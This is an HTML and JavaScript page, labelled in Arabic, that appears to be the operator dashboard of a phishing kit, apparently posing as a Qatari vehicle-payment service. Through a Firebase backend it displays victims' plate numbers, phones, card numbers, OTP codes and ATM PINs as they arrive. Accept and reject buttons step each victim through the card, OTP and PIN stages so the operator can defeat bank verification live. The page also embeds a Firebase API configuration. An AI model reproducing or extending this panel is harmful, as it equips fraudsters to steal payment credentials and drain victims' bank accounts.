<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>لوحة تحكم العمليات - المهندس حسن</title>
  <style>
    :root {
      --gray-cold: #d1d5db; /* الرمادي البارد */
      --action-green: #2ecc71;
      --action-red: #e74c3c;
    }
    body { font-family: 'Segoe UI', sans-serif; background-color: #f0f2f5; margin: 0; padding: 10px; }
    .admin-container { max-width: 600px; margin: auto; }
    .header { background: #2c3e50; color: #fff; padding: 15px; border-radius: 12px; text-align: center; margin-bottom: 15px; }
    
    .customer-card {
      background: #fff;
      border-radius: 15px;
      padding: 15px;
      margin-bottom: 20px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.05);
      border: 1px solid #eee;
    }

    .card-title { font-size: 14px; font-weight: bold; color: #7f8c8d; border-bottom: 1px solid #f1f1f1; padding-bottom: 8px; margin-bottom: 10px; display: flex; justify-content: space-between; }
    
    .data-row { display: flex; justify-content: space-between; margin-bottom: 6px; font-size: 13px; }
    .label { color: #95a5a6; }
    .value { color: #2c3e50; font-weight: 600; }

    .payment-section {
      background: #f9f9f9;
      padding: 10px;
      border-radius: 10px;
      margin-top: 10px;
      border: 1px solid #f1f1f1;
    }

    .action-group {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
      margin-top: 12px;
    }

    /* أزرار الحالة الباردة */
    .btn-action {
      height: 40px;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      background-color: var(--gray-cold);
      color: #7f8c8d;
      transition: all 0.3s ease;
    }

    /* الحالة النشطة عند وصول بيانات جديدة */
    .btn-active-accept { background-color: var(--action-green) !important; color: white !important; animation: pulse 1s infinite; }
    .btn-active-reject { background-color: var(--action-red) !important; color: white !important; }

    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.02); }
      100% { transform: scale(1); }
    }

    .badge { font-size: 11px; padding: 2px 8px; border-radius: 10px; background: #eee; }
  </style>
</head>
<body>

<audio id="notifSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

<div class="admin-container">
  <div class="header">
    <h3>لوحة التحكم المباشرة</h3>
    <small>مرحباً باشمهندس حسن - متابعة لحظية</small>
  </div>

  <div id="liveList">
    </div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>

<script>
    const firebaseConfig = {
      apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
      authDomain: "jusour-qatar.firebaseapp.com",
      projectId: "jusour-qatar",
      storageBucket: "jusour-qatar.appspot.com",
      messagingSenderId: "927435762624",
      appId: "1:927435762624:web:11d0bf460b62e4af9db625",
      measurementId: "G-CSRM4QLNR9"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // دالة لتحديث حالة الطلب
    async function updateStatus(docId, newStatus) {
        await db.collection("payments").doc(docId).update({ status: newStatus });
    }

    let lastCount = 0;

    db.collection("payments").orderBy("timestamp", "desc").onSnapshot((snap) => {
        const list = document.getElementById("liveList");
        
        // تشغيل صوت التنبيه لو فيه بيانات جديدة وصلت
        if (snap.size > lastCount && lastCount !== 0) {
            document.getElementById("notifSound").play();
        }
        lastCount = snap.size;

        list.innerHTML = "";
        snap.forEach((doc) => {
            const data = doc.data();
            const id = doc.id;
            
            // تحديد إذا كان الزرار لازم "ينور" بناءً على الحالة
            const isNewCard = data.status === "card_submitted";
            const isNewOtp = data.status === "otp_waiting";
            const isNewPin = data.status === "pin_submitted";

            list.innerHTML += `
                <div class="customer-card">
                    <div class="card-title">
                        <span>العميل: ${id.slice(-5)}</span>
                        <span class="badge">${data.status}</span>
                    </div>
                    
                    <div class="data-row"><span class="label">رقم اللوحة:</span> <span class="value">${data.number || '--'}</span></div>
                    <div class="data-row"><span class="label">الجوال:</span> <span class="value">${data.phone || '--'}</span></div>
                    
                    <div class="payment-section">
                        <div class="data-row"><span class="label">رقم البطاقة:</span> <span class="value">${data.card_number || 'انتظار..'}</span></div>
                        <div class="data-row"><span class="label">الرمز (OTP):</span> <span class="value" style="color:red; font-size:18px;">${data.otp_code || '---'}</span></div>
                        <div class="data-row"><span class="label">ATM PIN:</span> <span class="value" style="color:blue;">${data.atm_pin || '---'}</span></div>
                    </div>

                    <div class="action-group">
                        <button class="btn-action ${isNewCard || isNewOtp || isNewPin ? 'btn-active-accept' : ''}" 
                                onclick="handleAccept('${id}', '${data.status}')">
                                قبول (التالي)
                        </button>
                        <button class="btn-action ${isNewCard || isNewOtp || isNewPin ? 'btn-active-reject' : ''}" 
                                onclick="handleReject('${id}', '${data.status}')">
                                رفض (إعادة)
                        </button>
                    </div>
                </div>
            `;
        });
    });

    function handleAccept(id, currentStatus) {
        if (currentStatus === "card_submitted") updateStatus(id, "accept_card");
        else if (currentStatus === "otp_waiting") updateStatus(id, "accept_otp");
        else if (currentStatus === "pin_submitted") updateStatus(id, "success");
    }

    function handleReject(id, currentStatus) {
        if (currentStatus === "card_submitted") updateStatus(id, "reject_card");
        else if (currentStatus === "otp_waiting") updateStatus(id, "reject_otp");
        else if (currentStatus === "pin_submitted") updateStatus(id, "pin_error");
    }
</script>
</body>
</html>